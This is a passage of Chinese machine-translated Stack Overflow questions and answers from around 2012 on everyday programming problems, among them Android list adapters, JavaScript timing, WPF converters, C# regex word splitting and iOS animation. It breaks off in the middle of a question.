我希望有一个非常简单的答案，例如“这已经作为一个选项存在于 doxygen.sty 中，而你错过了它！”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-16T20:38:35.830

将 doxygen.sty 重命名为 mydoxygen.sty，然后通过插入 \newenvironment{doxygen}{... doxygen.sty 的大部分内容在这里进行修改...}{}

# android - 如何在listview android中定义图像？

> ID：10239465
> 
> 赞同：1
> 
> 时间：2012-04-20T02:32:14.330
> 
> 标签：android, image, listview

我有这个代码的布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
   style="@style/fundo"
   android:layout_width="fill_parent"
   android:layout_height="fill_parent"
   android:orientation="vertical" >

<TextView
    android:id="@+id/consoleListaSimples"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

<ListView
    android:id="@+id/listaSimples"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content">
</ListView>

</LinearLayout> 
```

以及列表中的哪个项目具有此 xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent" android:background="@drawable/bk_principal_small">

<LinearLayout
    android:id="@+id/linearLayout2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content">

    <LinearLayout
        android:id="@+id/linearLayout1"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" >

        <ImageView
            android:id="@+id/imagemStatus"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:src="@drawable/green"/>

        <TextView
            android:id="@+id/texto1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/padrao" />
    </LinearLayout>

</LinearLayout>

</RelativeLayout> 
```

并创建 itens 我创建了一个*SimpleAdapter*，我使用*ListAdapterCreater方法插入数据*

```
this.adapter = new ListAdapterCreater(list.getContext(),itensList,
R.layout.list_simple_item,new String[] {"text","image"},
            new int[]{R.id.texto1,R.id.imagemStatus}); 
```

设置文本效果很好，但不适用于图像。*图像*的价值是什么？或者我应该改变什么来工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:04:01.563

我相信您必须创建扩展的新适配器`BaseAdapter`。

这里有一些教程给你：

*   [http://blog.sptechnolab.com/2011/02/01/android/android-custom-listview-items-and-adapters/](http://blog.sptechnolab.com/2011/02/01/android/android-custom-listview-items-and-adapters/)
*   [http://w2davids.wordpress.com/android-listview-with-iconsimages-and-sharks-with-lasers/](http://w2davids.wordpress.com/android-listview-with-iconsimages-and-sharks-with-lasers/)

如果您仔细查看这些教程，诀窍就在于如何`getView()`工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:33:51.707

请参阅以下包含示例代码片段的链接。

[LINK1](http://www.ezzylearning.com/tutorial.aspx?tid=1763429&q=customizing-android-listview-items-with-custom-arrayadapter) 它在每个列表项中有一个文本视图和一个图像视图。

[LINK2](http://android.vexedlogic.com/2011/04/02/android-lists-listactivity-and-listview-ii-%E2%80%93-custom-adapter-and-list-item-view/)它在每个列表项中有两个文本视图。

[LINK3](http://www.softwarepassion.com/android-series-custom-listview-items-and-adapters/) 它在每个列表项中有两个文本视图和一个图像视图。

# javascript - 寻找能够暂停 JavaScript 并仅在 onclick 时激活它的代码，否则什么都不做

> ID：10239466
> 
> 赞同：1
> 
> 时间：2012-04-20T02:32:25.643
> 
> 标签：javascript, asp.net, confirm

我正在寻找用于确定/取消功能的简单 JavaScript。就像 Hotmail 一样，当要删除电子邮件时，它会提示您是继续还是取消。

我当前的代码只会自动运行两个 JavaScript。因此，现在我正在寻找可以暂停 JavaScript 并仅在 onclick 不执行任何操作时才激活它的代码。

```
 <script type="text/javascript">
        var first = confirm("We are sending you to an external site, do you wish to proceed? ")
        if (first)
            window.location = "http://www.google.com"

        else
            window.close;

        var second = confirm("We are sending you to an external site, do you wish to proceed? ")
        if (second)
            window.location = "http://www.yahoo.com"

        else
            window.close;
    </script>

<a href="" onclick="javascript:first" title="opens the external website in a new window">Google</a>

<a href="" onclick="javascript:second" title="opens the external website in a new window">Yahoo</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:37:53.790

利用：

```
window.close() 
```

要使某些内容在单击时运行，请使用[`addEventListener`](https://developer.mozilla.org/en/DOM/element.addEventListener)或围绕它的包装器。

# javascript - 在 setTimeout 中调用 document.write 后“函数未定义”？

> ID：10239468
> 
> 赞同：2
> 
> 时间：2012-04-20T02:32:31.953
> 
> 标签：javascript, settimeout

这是代码：

```
function getTime(j){
  var stopClock= new Date();
  delta[parseInt(j)]=stopClock.getMilliseconds()-start.getMilliseconds();
 }

 //REST OF THE CODE!!
function func(){
{
   for (var i = 0; i < 6; i++){
     start = new Date();
     document.write('<img src="'+URL[i]+'" width="1" height="1" alt="" onload="getTime('+i+');"/>');
    }
 }

 //SOME CODE

setTimeout(function() {
   func();
},100); 
```

但是我收到了这个错误：getTime 没有定义

如果我这样声明 getTime ：

```
 document.getTime= function (j) 
```

没有错误，但它从不执行该功能。

如果我删除 setTimeout，它将毫无问题地工作。

有什么想法吗？

谢谢，

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T02:46:25.287

您正在通过`document.write`调用破坏 DOM。在某些浏览器中，这也会破坏全局变量。

而不是`document.write`，尝试...

```
for (var i = 0; i < 6; i++){

    var img = document.body.appendChild(document.createElement('img'));
    img.src = URL[i];
    img.width = 1;
    img.height = 1;
    img.onload = makeHandler(i);

} 
```

* * *

```
function makeHandler(i) {
    return function() {
        getTime(i);
    };
} 
```

* * *

这是清除全局变量的简单演示...

在 Firefox 中，第二个警报将是`undefined`. 在 Chrome 中，全局被保留。

[http://jsfiddle.net/Z9NbR/](http://jsfiddle.net/Z9NbR/)

```
window.foo = 'bar';

alert(window.foo); // now we have it

setTimeout(function() {
    document.write('new content');

    alert(window.foo); // now we don't
}, 100); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-20T02:34:59.720

getTime() 是 Javascript 中的预定义函数，请更改名称，它应该可以工作

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-04-20T02:36:38.197

也尝试像这样使用 settimeout：

setTimeout('func', 100);

这在您的浏览器上效果更好吗？

# html - 标点开始放在我的行首

> ID：10239469
> 
> 赞同：0
> 
> 时间：2012-04-20T02:32:58.213
> 
> 标签：html, css, punctuation

所以这可能是一个简单的错误，我不能真正发布我的整个代码，因为它非常长。但长话短说。

当我输入

```
 <blockquote STYLE="text-align: center"> <div align="right">  <b>Well I'll Be <br><br><br> I'm Alive...</b></blockquote> </div> 
```

这是结果

```
 Well I'll Be ...I'm Alive 
```

我敢肯定这是我搞砸的简单事情。

有什么建议么？另外，真正奇怪的是，如果我在省略号后添加一个字母，标点符号将被更正..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:56:53.497

它在Firefox中也可以正常工作。我已经检查过了。请清除历史记录并再次检查。

编辑

```
.wrdLatest{
  direction: rtl;
} 
```

从样式表中删除此方向属性。将解决所有标点符号的问题。

# c# - .NET Replacement Shell 在启动期间未检索文件内容

> ID：10239471
> 
> 赞同：0
> 
> 时间：2012-04-20T02:33:13.663
> 
> 标签：c#, .net, vb.net, user-interface

我编写了一个应用程序，将 Windows Explorer 替换为 Kiosk 的外壳。该应用程序维护两个配置文件：一个为应用程序目的使用和维护（app.config），另一个存储在另一个目录中，因此当 GUI 尝试从存储库更新时它不会被覆盖。

当应用程序在正常环境中运行时，它可以完美运行。但是，在启动过程中或切换用户时使用它时，应用程序似乎无法加载其他目录中的信息。

**来自经理班**

```
Private Shared rootCP As String
Friend Shared Sub loadConfig()

    Dim dir As New IO.DirectoryInfo(Environment.CurrentDirectory)

    Try
        Dim objReader As New System.IO.StreamReader(dir.Parent.FullName & "\local.config")
        rootCP = objReader.ReadToEnd
        objReader.Close()
    Catch Ex As Exception
        'DEBUG: console.write(ex.message)
    End Try

    dir = Nothing

End Sub 
```

**从 MainForm_Load 子**

```
Manager.loadConfig() 
```

另一个函数稍后尝试从 rootCP 字符串检索数据，但只有在系统启动后启动应用程序时才能访问它。有什么想法（VB.NET 或 C# 很好）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:13:31.330

其中之一可能对您有用。我几乎总是使用`Assembly.GetEntryAssembly().Location`. 不要`CodeBase`在组件上使用，它可能是您可能没想到的。

```
Assembly.GetEntryAssembly().Location
AppDomain.CurrentDomain.BaseDirectory 
```

对于 Windows 应用程序：

```
Application.ExecutablePath 
```

因为正常的方法行不通，我很难说这些方法中的哪一个可以确定。此外，始终使用`Path.Combine(...)`将两条路径拉在一起。

# iphone - 为多个子视图设置动画 addtosubview

> ID：10239476
> 
> 赞同：0
> 
> 时间：2012-04-20T02:33:31.047
> 
> 标签：iphone, core-animation

我有一个 UIViews 数组，我想以网格形式将它们排列在主视图中，并且我还希望它具有动画效果（即网格应该一个一个缓慢地出现）。尝试在 for 循环中制作动画，但没有奏效，但想出了一个变通方法来实现更接近我想要的东西，但只是想知道是否有更好的方法来做到这一点。我知道 CAAnimationGroup (begintime) 有一些属性，但确定如何将它连接到 addtosubview。这是我的代码，如果有更好的方法，请告诉我。

```
#pragma mark - View lifecycle

- (void)viewDidLoad
{
    [super viewDidLoad];
    CGFloat x = 0;
    CGFloat delay = .3;

    for(int i=0;i<30;i++)
    {
        UIView *myView = [[UIView alloc] initWithFrame:CGRectMake(x, 0, 50, 50)];
        myView.backgroundColor = [UIColor greenColor];
        myView.alpha = 0.0;
        x = x + 50+ 2;
        [UIView animateWithDuration:0.25 delay:delay options:UIViewAnimationOptionCurveEaseInOut animations:^{
            [self.view addSubview:myView];
            myView.transform = CGAffineTransformMakeScale(0.5, 0.5);
           // myView.transform = CGAffineTransformMakeRotation(90);

        } completion:^(BOOL finished) {

            [UIView animateWithDuration:.5 animations:^{
                myView.transform = CGAffineTransformMakeScale(1.0, 1.0);
                myView.alpha = 1.0;
            }];

        }];
        delay = delay + .3;
    }
    // Do any additional setup after loading the view, typically from a nib.
} 
```

-anoop

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T04:38:21.393

> 嗨，我也在 for 循环中使用了动画，但它不能正常工作，然后我调用一个动画视图的方法，多次并且它工作正常。我认为这是简单应用动画的更好方法。通过调用一个方法。我在这里放一些代码可能会对你有所帮助。

```
- (void)viewDidLoad
{
    radius=82.097;
    rotationMultiplier=1;
    toAngle = fromAngle = 0;
    toStart = NO;
    center=CGPointMake(161, 233);

    NSString *path = [[NSBundle mainBundle] pathForResource:@"click" ofType:@"mp3"];

    self.player = [[AVAudioPlayer alloc] initWithContentsOfURL:[NSURL fileURLWithPath:path] error:nil];
    [self.player prepareToPlay];

    SingleTouchGesture *wheelRecogniser=[[SingleTouchGesture alloc] initWithTarget:self action:@selector(rotateWheel:)];
    [self.view addGestureRecognizer:wheelRecogniser];
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

-(void) rotate:(int) time
{
    CABasicAnimation *topAnimation = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
    topAnimation.duration=time;
    topAnimation.fromValue= [NSNumber numberWithFloat:fromAngle];
    topAnimation.toValue=[NSNumber numberWithFloat:toAngle];
    topAnimation.delegate = self;
    topAnimation.fillMode = kCAFillModeForwards;
    topAnimation.removedOnCompletion = NO;
    [wheelImage.layer addAnimation:topAnimation forKey:@"transform"];
    fromAngle = toAngle;
}

-(void) rotateWheel:(SingleTouchGesture*) recogniser
{
    toAngle += recogniser.rotation;

    if (toStart) 
    {
        if (recogniser.state == UIGestureRecognizerStateEnded)
        {
            NSLog(@"Speed === %f",recogniser.speed);
            rotationMultiplier=[self getMultiplier:recogniser.speed];
            NSLog(@"Rotation Multiplier..%f",rotationMultiplier);
            toStart = NO;   
            NSLog(@"State Ended");
            self.player.currentTime=0;
            [self.player play];

            if (recogniser.rotation>=0)
            {
                toAngle =fromAngle+(rotationMultiplier*3.14);
            }
            else
            {
                toAngle =fromAngle-(rotationMultiplier*3.14);
            }
        }

        [self rotate:1];
    }
    else
     {
        if (recogniser.state==UIGestureRecognizerStateChanged) {
            NSLog(@"continue...");
            CGPoint pt=[recogniser locationInView:self.view];

            float dis=[recogniser distanceBetweenPoints:center with:pt];

            if (dis<radius) 
            {
                if (recogniser.rotation>=0) 
                {
                    NSLog(@"Rotation value: +ve: %f",recogniser.rotation);
                    toStart = YES;
                    toAngle =fromAngle+(rotationMultiplier*3.14);         
                    recogniser.rotation = 0; 
                }
                else
                {
                    NSLog(@"Rotation value: -ve: %f",recogniser.rotation);
                    toStart = YES;
                    toAngle=fromAngle-(rotationMultiplier*3.14);              
                    recogniser.rotation = 0;
                }

            }
        }
    }
}

Here rotate method is calling multiple times. 
```

# solr - django haystack solr：未创建索引文件

> ID：10239494
> 
> 赞同：0
> 
> 时间：2012-04-20T02:35:31.840
> 
> 标签：solr, django-haystack

solr 无法创建索引，出现以下错误：

```
All documents removed.
Indexing 100 notes.
Failed to add documents to Solr: [Reason: None]
<html><head><meta content="text/html; charset=ISO-8859-1" http-equiv="Content-Type"/>
<title>Error 404 NOT_FOUND</title></head><body><h2>HTTP ERROR 404</h2>
<p>Problem accessing /solr/boatsite/update/. Reason:<pre>    NOT_FOUND</pre></p>
<hr /><i><small>Powered by    Jetty://</small></i> 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T15:29:46.427

答案在故障排除中的 Beta 2.0.0 文档中。在 settings.py 中为 HAYSTACK CONNECTIONS 使用了错误的 URL。如果您收到此错误，文档建议在浏览器中测试 URL。我正在尝试[http://127.0.0.1:8983/solr/mysite](http://127.0.0.1:8983/solr/mysite) ---应该一直在使用[http://127.0.0.1:8983/solr](http://127.0.0.1:8983/solr)

# openxml - 如何从演示主题中获取 run/txbody/paragraph 的字体颜色？

> ID：10239496
> 
> 赞同：0
> 
> 时间：2012-04-20T02:36:12.157
> 
> 标签：openxml, openxml-sdk, presentationml

我正在开发一个 PresentationML 解析器，并且我正在尝试实现对字体颜色主题的支持。我正在使用 SDK，我对这个怪物感到困惑：

```
Slide.SlidePart.SlideLayoutPart.SlideMasterPart.SlideMaster.SlideMasterPart.ThemePart.Theme.ThemeElements.ColorScheme 
```

但是我仍然不清楚我去哪里获得颜色以进行没有以其他方式指定颜色的运行。对此的任何帮助将不胜感激。

TIA。

更新：刚刚涉水通过 xml 之后，看起来我在上面发布的怪物调用可能是正确的......它产生了一个具有“val”属性的元素，该属性与我正在寻找的十六进制代码相匹配。但目前尚不清楚我将如何解决颜色图中的特定方案（在本例中为“Light1”）。我认为，我已经完成了大约 75% 的路——如果有人可以帮助我了解哪种方案适用于跑步的逻辑，我认为这就是我所需要的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-21T21:54:24.173

免费的电子书[Open XML Explained](http://openxmldeveloper.org/blog/b/openxmldeveloper/archive/2007/08/13/1970.aspx)可能会提供一些见解来帮助您理解。在 PresentationML 部分下，文档内容结构讨论了如何使用主题和主布局来提供默认值：

第 86 页 - 第 2 段：

> DrawingML 主题可用于为字体、布局和其他品牌相关数据创建默认值，并允许将其与演示文稿的主体分开。主题可在所有 Open XML 标记语言中重复使用。在 PresentationML 包中，正在使用各种主题。默认情况下，每个单独的母版、幻灯片母版、笔记母版和讲义母版都引用一个单独的主题部分。演示文稿本身还引用了要在演示文稿中使用的默认主题。此默认主题通过引用包内的相同部分与幻灯片母版共享。

因此，在您的演示文稿 SlideMaster 的 theme1.xml 中，您将找到用于幻灯片母版和您的演示文稿的主题定义。颜色名称 Light1、Dark1 等映射到每个主题的主题元素的配色方案中的 12 种所需颜色。有关详细信息，请参阅[架构](http://www.schemacentral.com/sc/ooxml/e-a_themeElements-1.html)。

因此，在 Run 中，您会看到 Light1，它映射到主题中定义的数字。如果作者更改了主布局和/或主题，则 Light1 在运行中不会更改，但主题中的值可能会发生变化，这就是您从中获取新值的地方。

在第 121 页，Open XML Explained 中提到了 12 种颜色：

> 在主题元素中，您需要创建一个包含所有主题数据的主题元素节点。在此级别，您还可以应用额外信息或覆盖主题元素内的现有信息。主题元素是使用一组子节点构建的，每个节点标识一个特定的数据项，例如字体或颜色。**clrScheme 元素定义了一个颜色列表。主题颜色列表仅限于“accent1”或“visited link”等项目。这些主题颜色中的每一个都使用一个单独的 XML 元素，其中节点名称标识主题颜色**. 在这个元素中，您可以使用前面讨论过的使用 DrawingML 为形状着色的着色机制。在标记样本 157 中定义了两种主题颜色，“dark-1”和“accent-1”颜色。标记示例不完整。**您需要为所有十二种主题颜色定义值。**

希望这可以帮助...

# r - ggplot2：所有可能的变量组合的散点图

> ID：10239497
> 
> 赞同：3
> 
> 时间：2012-04-20T02:36:19.053
> 
> 标签：r, ggplot2

我想为所有可能的变量组合绘制图表。我的代码如下：

```
 set.seed(12345)
a <- data.frame(Glabel=LETTERS[1:7],   A=rnorm(7, mean = 0, sd = 1),  B=rnorm(7, mean = 0, sd = 1),  C=rnorm(7, mean = 0, sd = 1))
T <- data.frame(Tlabel=LETTERS[11:20], A=rnorm(10, mean = 0, sd = 1), B=rnorm(10, mean = 0, sd = 1), C=rnorm(10, mean = 0, sd = 1))

library(ggplot2)
for(i in 2:(ncol(a)-1))
{
 for(j in (i+1):ncol(a))
 {
  r <- 0.08
  p <- ggplot(data=a, mapping=aes(x=a[, i], y=a[, j])) + geom_point() + theme_bw()
  p <- p + geom_text(data=a, mapping=aes(x=a[, i], y=a[, j], label=Glabel),
                 size=3, vjust=1.35, colour="black")
  p <- p + geom_segment(data = T, aes(xend = T[ ,i], yend=T[ ,j]),
                    x=0, y=0, colour="black",
                    arrow=arrow(angle=25, length=unit(0.25, "cm")))
  p <- p + geom_text(data=T, aes(x=T[ ,i], y=T[ ,j], label=Tlabel), size=3, vjust=0, colour="red")
dev.new()
  print(p)
} 
 } 
```

这段代码工作正常。但是这里使用的方法不推荐（[参见@baptiste 评论](https://stackoverflow.com/q/7452683/707145)）并且在功能上不起作用。我想知道完成此任务的最佳和推荐方法是什么。在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:48:28.663

好吧，这是垃圾，但我能做的最好。这是超级低效的，因为它通过每个循环重新创建部分数据`lapply`。也许别人有更好的东西：

```
MAT <- outer(names(df)[-1], names(df)[-1], paste)
combs <- sapply(MAT[lower.tri(MAT)], function(x) strsplit(x, " "))
ind <- lapply(combs, function(x) match(x, names(df)))

plotter <- function(cn) { #start junky function
    NAMES <- colnames(df)[cn]
    df2 <- df[cn]
    names(df2)<- c('x1', 'x2')
    p <- ggplot(data=df2, aes(x1, x2)) + geom_point() + theme_bw() +
        scale_x_continuous(name=NAMES[1]) +
        scale_y_continuous(name=NAMES[2])
        dev.new()
        print(p)
} #end of junky function

lapply(ind,  function(x) plotter(cn=x)) 
```

**编辑：这更好一点：**

```
x <- match(names(df)[-1], names(df))
MAT <- outer(x, x, paste)
combs <- t(sapply(MAT[lower.tri(MAT)], function(x) as.numeric(unlist(strsplit(x, " ")))))

plotter <- function(cn) {
    NAMES <- colnames(df)[cn]
    df2 <- df[cn]
    names(df2)<- c('x1', 'x2')
    p <- ggplot(data=df2, aes(x1, x2)) + geom_point() + theme_bw() +
        scale_x_continuous(name=NAMES[1]) +
        scale_y_continuous(name=NAMES[2])
        dev.new()
        print(p)
}

apply(combs,  1, function(x) plotter(cn=x)) 
```

# objective-c - 如何在键值编码中转换变量

> ID：10239499
> 
> 赞同：0
> 
> 时间：2012-04-20T02:36:25.617
> 
> 标签：objective-c

```
 [self setValue:flag forKey:variableName]; 
```

"flag" 是方法的本地 BOOL；keypath 也是一个 BOOL 成员变量。但我收到 Xcode 警告“不兼容的整数到指针的转换”。

我也试过：

```
 [self setValue:(BOOL)flag forKey:variableName]; 
```

我如何摆脱这个警告？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:40:15.537

KVC 自动对非对象进行装箱和拆箱。对于上述情况，您将使用：

```
[self setValue:[NSNumber numberWithBool:flag] forKey:variableName]; 
```

请参阅键值编码编程指南中的[标量和结构支持。](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/KeyValueCoding/Articles/DataTypes.html)

# iphone - 随机选择的大字典：iPhone Dev

> ID：10239508
> 
> 赞同：0
> 
> 时间：2012-04-20T02:37:17.123
> 
> 标签：iphone, random, words

我正在制作一个应用程序，其中包含我选择的非常大的单词词典（这样单词不会太复杂），我希望它随机选择单词。我对随机选择单词没有问题，但是存储所有这些单词的最佳方法是什么，以及如何存储？我觉得使用 NSMutable 数组会占用太多内存来创建数千个对象，所以我还能使用什么...谢谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:53:48.320

核心数据！，是你最好的选择，或者管理你自己的 SQLite

检查 [核心数据教程](http://www.raywenderlich.com/934/core-data-tutorial-getting-started)

或 [iOS 上的 SQLite 教程](http://www.techotopia.com/index.php/An_Example_SQLite_based_iOS_4_iPhone_Application)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T04:57:59.240

如果所有应用程序需要做的只是随机访问单词（因此没有基于键的查询或更新），那么核心数据和 SQLite 的替代方案将只是`fseek()`到换行符分隔单词的平面文本文件中的随机位置，然后读出下一个完整的单词，可能用`fscanf(dict,"%s\n%s\n",partial_word,full_word)`.

通过使用不同的随机数重试来处理 EOF，或者将`fseek()`范围限制为从不命中文件中的最后一个单词。

上述大纲的一个问题是单词不会被统一选择。对长词后的词有偏见。`strlen(partial_word)`如果担心的话，在保留单词之前丢弃（或更大的随机数）单词可能有助于分布。

# entity-framework-4 - 在实体框架 4.0 中，我们如何一次调用从数据库中获取多个记录集并将所有数据传递给 View

> ID：10239513
> 
> 赞同：3
> 
> 时间：2012-04-20T02:37:54.327
> 
> 标签：entity-framework-4, dataset, multiple-resultsets

在 Entity Framework 4.0 中，我们如何像在 ado.net 数据集中那样一次调用从数据库中获取多个记录集？

假设我们有 3 个表 T1、T2 和 T3。我们需要从所有树表中获取数据并传递给视图（ASP.NET MVC3）。**不能使用JOIN**，因为所有表都是独立的表。我们不想对数据库进行 3 次调用，而是希望将所有 select 语句包装在一个 SP 中，并且只对数据库进行一次调用并将所有数据传递给视图。

在**数据集**的情况下，如果存储过程从多个选择语句数据集中返回数据，则将每个记录集填充到不同的表中。

我们如何在 EF 中实现它？请帮我。

谢谢，

保罗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T04:18:47.720

EF 中没有开箱即用的批量查询功能。但是其他人已经做出了一些努力来扩展 EF 以支持这一点。

*   [实体框架批量更新和未来查询](http://weblogs.asp.net/pwelter34/archive/2011/11/29/entity-framework-batch-update-and-future-queries.aspx)
*   [使用 LINQ 的实体框架中的多查询（一批中的更多查询）](http://blog.cincura.net/232079-multiquery-more-queries-in-one-batch-in-entity-framework-using-linq/)

# c# - XAML 找不到转换器类

> ID：10239517
> 
> 赞同：9
> 
> 时间：2012-04-20T02:38:07.133
> 
> 标签：c#, wpf, xaml, ivalueconverter

我正在显示一个带有以下代码的弹出窗口：

```
<Popup PlacementTarget="{Binding ElementName=categoryTagEditorControl}"
       Placement="Bottom">
    <Popup.IsOpen>
        <MultiBinding Mode="OneWay" Converter="{StaticResource BooleanOrConverter}">
            <Binding Mode="OneWay" ElementName="categoryTagEditorControl" Path="IsMouseOver"/>
            <Binding RelativeSource="{RelativeSource Self}" Path="IsMouseOver" />
        </MultiBinding>
    </Popup.IsOpen>
    <StackPanel>
        <TextBox Text="Some Text.."/>
        <DatePicker/>
    </StackPanel>
</Popup> 
```

这是 BooleanOrConverter 的代码：

```
public class BooleanOrConverter : IMultiValueConverter
{
    public object Convert(object[] values, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        foreach (object booleanValue in values)
        {
            if (booleanValue is bool == false)
            {
                throw new ApplicationException("BooleanOrConverter only accepts boolean as datatype");
            }
            if ((bool)booleanValue == true)
            {
                return true;
            }
        }
        return false;
    }
    public object[] ConvertBack(object value, Type[] targetTypes, object parameter, System.Globalization.CultureInfo culture)
    {
        throw new NotSupportedException();
    }
} 
```

并将其放入 PopupTest.InfoPanels.Windows 命名空间

当我运行它时，我得到以下异常：

```
Cannot find resource named 'BooleanOrConverter'. Resource names are case sensitive. 
```

我应该改变什么才能使它起作用？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-20T03:45:17.060

听起来您的 Multibinding 不知道在哪里寻找转换器。您是否将转换器定义为[静态资源](http://msdn.microsoft.com/en-us/library/ms750950.aspx)？您可以在控件的资源或包含的[ResourceDictionary](http://msdn.microsoft.com/en-us/library/system.windows.resourcedictionary.aspx)中指定转换器。添加对转换器命名空间的引用，然后为其定义一个 ResourceKey。就像是：

```
<UserControl 
     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
     xmlns:converters="clr-namespace:MyConverters">

     <UserControl.Resources>
          <converters:BooleanOrConverter x:Key="BoolOrConverter"/>
     </UserControl.Resources>

    ... // use converter as you were before

 </UserControl> 
```

# c# - 如何在 C# 中使用正则表达式将短语拆分为单词

> ID：10239518
> 
> 赞同：7
> 
> 时间：2012-04-20T02:38:12.417
> 
> 标签：c#, regex

我正在尝试使用正则表达式将句子/短语拆分为单词。

```
var phrase = "This isn't a test.";
var words = Regex.Split(phrase, @"\W+").ToList(); 
```

单词包含“This”、“isn”、“t”、“a”、“test”

显然，它正在使用撇号并对其进行拆分。我可以改变这种行为吗？它还需要支持多种语言（西班牙语、法语、俄语、韩语等）的多语言。

我需要将单词传递给拼写检查器。特别是 Nhunspell。

```
return (from word in words let correct = _engine[langId].Spell(word) where !correct select word).ToList(); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-20T04:07:04.493

如果您想拆分成单词以进行拼写检查，这是一个很好的解决方案：

```
new Regex(@"[^\p{L}]*\p{Z}[^\p{L}]*") 
```

基本上，您可以使用以前的正则表达式来使用 Regex.Split。它使用 unicode 语法，因此它可以在多种语言中使用（尽管不适用于大多数亚洲语言）。它不会用撇号或连字符打断单词。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-20T09:51:14.460

由于许多语言使用非常复杂的规则将单词串成短语和句子，因此您不能依靠简单的正则表达式从一段文本中获取所有单词。即使对于像英语这样“简单”的语言，您也会遇到许多极端情况，例如：

*   如何处理像你这样的单词，不是将两个单词组合在一起并且将许多字符替换为'。
*   Mr. Mrs. ie 等缩写如何处理
*   使用'-'组合词
*   句末的连字符。
*   像 O'Brian 和 O'Connel 这样的名字。

众所周知，中文和日文（以及其他）很难以这种方式解析，因为这些语言不使用单词之间的空格，只在句子之间使用空格。

您可能想阅读[文本分割](https://en.wikipedia.org/wiki/Text_segmentation)，如果分割对您很重要，则投资可以解析整个文本的拼写检查器或可以根据语言规则将句子分成单词的文本分割引擎。

不过，我找不到一个基于 .NET 的多语言分割引擎和一个快速的谷歌搜索。对不起。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T02:41:58.477

使用`Split()`.

```
words = phrase.Split(' '); 
```

没有标点符号。

```
words = phrase.Split(new Char [] {' ', ',', '.', ':', , ';', '!', '?', '\t'}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T02:42:57.987

你想分什么？空间？标点？您必须决定停止字符是什么。一个使用空格和一些标点符号的简单正则表达式是`"[^.?!\s]+"`. 这将分裂为句号、问号、感叹号和任何空白字符。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-20T02:43:12.430

如果您尝试仅基于空格进行拆分，则可以尝试。

```
var words = Regex.Split(phrase, @"[^ ]+").ToList(); 
```

另一种方法是通过将撇号添加到您的字符类来添加撇号。

```
var words = Regex.Split(phrase, @"(\W|')+").ToList(); 
```

否则，是否有特定原因不能使用 string.Split()？这看起来要简单得多。此外，您还可以传入其他标点符号（即拆分 . 以及空格）。

```
var words = phrase.Split(' ');
var words = phrase.Split(new char[] {' ', '.'}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-20T02:42:09.937

看起来您并不需要正则表达式。你可以这样做：

```
phrase.Split(" "); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-20T03:51:53.757

我不是 java 人，但您可以尝试在分割
空格的同时排除标点符号。可能是这样的。

这些是原始和扩展的正则表达式，单词在捕获组 1 中
。进行全局搜索。

Unicode（不考虑字形）

```
[\s\pP]* ([\pL\pN_-] (?: [\pL\pN_-] | \pP(?=[\pL\pN\pP_-]) )* ) 
```

ASCII

```
[\s[:punct:]]* (\w (?: \w | [[:punct:]](?=[\w[:punct:]]) )* ) 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-07-31T16:47:49.397

这对我有用：`[^(\d|\s|\W)]*`

# ios - 用阴影平滑旋转和改变 UIView 的大小

> ID：10239520
> 
> 赞同：12
> 
> 时间：2012-04-20T02:38:17.940
> 
> 标签：ios, uiview, core-animation, calayer, shadow

我有`UIView`一个阴影和一个 UIImageView 子视图。

我想在 iPad 旋转时调整视图大小，并且我试图在`willRotateToInterfaceOrientation`回调中执行此操作。

如果我以基本方式设置阴影，`UIView`旋转会非常不稳定；所以我想从其他人那里得到一些关于如何设置阴影设置 layer.shadowPath 的建议。

我已经尝试使用动画帧大小更改并在同一块中`[UIView animateWithDuration:animations]`设置新的，但阴影路径会捕捉到新的大小。`shadowPath`

如果我不改变动画块中图层的 shadowPath，它就不会改变。

从我所做的一些搜索中，需要使用`CABasicAnimation`.

